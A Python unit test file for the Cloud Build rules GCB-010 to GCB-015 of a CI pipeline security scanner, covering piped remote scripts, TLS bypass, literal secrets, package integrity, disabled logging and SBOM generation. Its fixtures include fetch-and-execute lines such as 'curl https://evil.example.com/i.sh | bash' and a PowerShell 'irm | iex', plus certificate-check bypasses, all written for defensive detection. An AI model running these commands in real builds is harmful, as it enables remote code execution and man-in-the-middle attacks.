"""Unit tests for the second-wave Cloud Build rules (GCB-010…015).

Mirrors the ``test_cloudbuild_phase1`` pattern — per-rule edge cases
the paired insecure/secure fixtures can't cover on their own.
"""
from __future__ import annotations

import yaml

from pipeline_check.core.checks.cloudbuild.rules import (
    gcb010_remote_script,
    gcb011_tls_bypass,
    gcb012_literal_secrets,
    gcb013_pkg_source_integrity,
    gcb014_logging_disabled,
    gcb015_sbom,
)


def _doc(text: str) -> dict:
    return yaml.safe_load(text)


# ──────────────────────────────────────────────────────────────────────
# GCB-010 — remote script piped to interpreter
# ──────────────────────────────────────────────────────────────────────


class TestGCB010:
    def test_curl_pipe_bash_fails(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    entrypoint: bash
    args: ['-c', 'curl https://evil.example.com/i.sh | bash']
""")
        f = gcb010_remote_script.check("<t>", d)
        assert f.passed is False
        assert "remote-script" in f.description.lower() or "pattern" in f.description

    def test_powershell_irm_iex_fails(self):
        d = _doc("""
steps:
  - name: 'mcr.microsoft.com/powershell@sha256:aa'
    entrypoint: pwsh
    args: ['-c', 'irm https://example.com/i.ps1 | iex']
""")
        f = gcb010_remote_script.check("<t>", d)
        assert f.passed is False

    def test_clean_pipeline_passes(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb010_remote_script.check("<t>", d)
        assert f.passed is True


# ──────────────────────────────────────────────────────────────────────
# GCB-011 — TLS / certificate verification bypass
# ──────────────────────────────────────────────────────────────────────


class TestGCB011:
    def test_curl_k_fails(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    entrypoint: bash
    args: ['-c', 'curl -k https://example.com/api']
""")
        f = gcb011_tls_bypass.check("<t>", d)
        assert f.passed is False

    def test_git_sslverify_false_fails(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/git@sha256:aa'
    entrypoint: bash
    args: ['-c', 'git config --global http.sslVerify false && git clone …']
""")
        f = gcb011_tls_bypass.check("<t>", d)
        assert f.passed is False

    def test_plain_curl_passes(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    entrypoint: bash
    args: ['-c', 'curl https://example.com/api']
""")
        f = gcb011_tls_bypass.check("<t>", d)
        assert f.passed is True


# ──────────────────────────────────────────────────────────────────────
# GCB-012 — credential-shaped literal in pipeline body
# ──────────────────────────────────────────────────────────────────────


class TestGCB012:
    def test_aws_key_in_substitutions_fails(self):
        d = _doc("""
substitutions:
  _AWS_KEY: AKIAIOSFODNN7EXAMPLE
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['echo', '$_AWS_KEY']
""")
        f = gcb012_literal_secrets.check("<t>", d)
        assert f.passed is False
        assert "AKIA" in f.description

    def test_clean_pipeline_passes(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['gcloud', 'version']
""")
        f = gcb012_literal_secrets.check("<t>", d)
        assert f.passed is True


# ──────────────────────────────────────────────────────────────────────
# GCB-013 — package install bypasses registry integrity
# ──────────────────────────────────────────────────────────────────────


class TestGCB013:
    def test_pip_git_install_fails(self):
        d = _doc("""
steps:
  - name: 'python@sha256:aa'
    entrypoint: bash
    args: ['-c', 'pip install git+https://example.com/internal/lib.git']
""")
        f = gcb013_pkg_source_integrity.check("<t>", d)
        assert f.passed is False

    def test_pinned_git_install_still_fails_without_sha_pin(self):
        # The primitive flags the git URL as a general integrity bypass;
        # SHA pinning is the fix documented in the recommendation text.
        d = _doc("""
steps:
  - name: 'python@sha256:aa'
    entrypoint: bash
    args: ['-c', 'pip install git+https://example.com/lib.git@main']
""")
        f = gcb013_pkg_source_integrity.check("<t>", d)
        # Branch-pin (``@main``) is still not a commit SHA, so it fails.
        assert f.passed is False

    def test_clean_install_passes(self):
        d = _doc("""
steps:
  - name: 'python@sha256:aa'
    entrypoint: bash
    args: ['-c', 'pip install -r requirements.txt']
""")
        f = gcb013_pkg_source_integrity.check("<t>", d)
        assert f.passed is True


# ──────────────────────────────────────────────────────────────────────
# GCB-014 — build logging disabled
# ──────────────────────────────────────────────────────────────────────


class TestGCB014:
    def test_logging_none_fails(self):
        d = _doc("""
options:
  logging: NONE
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb014_logging_disabled.check("<t>", d)
        assert f.passed is False
        assert "NONE" in f.description or "none" in f.description.lower()

    def test_logging_none_lowercase_fails(self):
        d = _doc("""
options:
  logging: none
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb014_logging_disabled.check("<t>", d)
        assert f.passed is False

    def test_cloud_logging_only_passes(self):
        d = _doc("""
options:
  logging: CLOUD_LOGGING_ONLY
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb014_logging_disabled.check("<t>", d)
        assert f.passed is True

    def test_gcs_only_passes(self):
        d = _doc("""
options:
  logging: GCS_ONLY
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb014_logging_disabled.check("<t>", d)
        assert f.passed is True

    def test_no_options_block_passes(self):
        # Missing options.logging inherits the Cloud Build default of
        # CLOUD_LOGGING_ONLY — logs are persisted.
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/gcloud@sha256:aa'
    args: ['version']
""")
        f = gcb014_logging_disabled.check("<t>", d)
        assert f.passed is True


# ──────────────────────────────────────────────────────────────────────
# GCB-015 — SBOM not produced
# ──────────────────────────────────────────────────────────────────────


class TestGCB015:
    def test_no_sbom_step_fails_when_image_produced(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/docker@sha256:aa'
    args: ['build', '-t', 'gcr.io/p/app:v1', '.']
images: ['gcr.io/p/app:v1']
""")
        f = gcb015_sbom.check("<t>", d)
        assert f.passed is False

    def test_syft_step_passes(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/docker@sha256:aa'
    args: ['build', '-t', 'gcr.io/p/app:v1', '.']
  - name: 'anchore/syft@sha256:bb'
    args: ['gcr.io/p/app:v1', '-o', 'cyclonedx-json']
images: ['gcr.io/p/app:v1']
""")
        f = gcb015_sbom.check("<t>", d)
        assert f.passed is True

    def test_trivy_sbom_step_passes(self):
        d = _doc("""
steps:
  - name: 'gcr.io/cloud-builders/docker@sha256:aa'
    args: ['build', '-t', 'gcr.io/p/app:v1', '.']
  - name: 'aquasec/trivy@sha256:bb'
    entrypoint: bash
    args: ['-c', 'trivy image --format cyclonedx --output sbom.json gcr.io/p/app:v1']
images: ['gcr.io/p/app:v1']
""")
        f = gcb015_sbom.check("<t>", d)
        assert f.passed is True

    def test_no_artifact_production_silent_pass(self):
        # A pipeline that only lints / tests (no images, no push) is
        # silently passed — SBOM isn't meaningful without an artifact.
        d = _doc("""
steps:
  - name: 'python@sha256:aa'
    args: ['pytest']
""")
        f = gcb015_sbom.check("<t>", d)
        assert f.passed is True
